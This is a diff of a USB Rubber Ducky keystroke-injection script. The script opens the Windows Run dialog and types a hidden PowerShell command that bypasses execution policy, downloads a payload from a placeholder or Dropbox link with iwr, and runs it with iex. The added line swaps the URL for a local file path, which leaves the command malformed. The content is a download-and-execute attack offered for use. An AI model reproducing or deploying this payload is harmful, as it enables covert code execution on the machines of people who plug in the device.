@@ -12,7 +12,7 @@ DEFINE TARGET_URL example.com
 DELAY 2000
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -ep Bypass $pl = iwr TARGET_URL dl=1; iex $pl
+STRING powershell -w h -NoP -NonI -ep Bypass $pl = iwr "C:\Users\johnp\Desktop\taxes" dl=1; iex $pl
 ENTER
 
 REM     Remember to replace the link with your DropBox shared link for the intended file to download in the DEFINE constant
